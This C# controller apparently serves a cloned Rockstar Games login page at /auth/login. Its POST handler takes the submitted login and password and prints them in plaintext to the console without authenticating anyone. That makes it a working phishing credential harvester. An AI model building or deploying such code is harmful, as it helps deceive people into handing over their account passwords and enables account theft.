using System;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using MyHttpServer.Framework.Attributes;

namespace MyHttpServer.Controllers;

[Controller("auth")]
public class AuthController
{
    //GET. /auth/login
    [Get("login")]

    public string login()
    {
        string path = Path.Combine(
            AppDomain.CurrentDomain.BaseDirectory,
            "static", "rockstargames",
            "index.html"
        );

        string html = File.ReadAllText(path);
        
        return html;
    }
    
    //POST: /auth/login

    [Post("login")]
    public void login(string login, string password)
    {
        Console.WriteLine($"Login: {login} | Password: {password}");
    }
}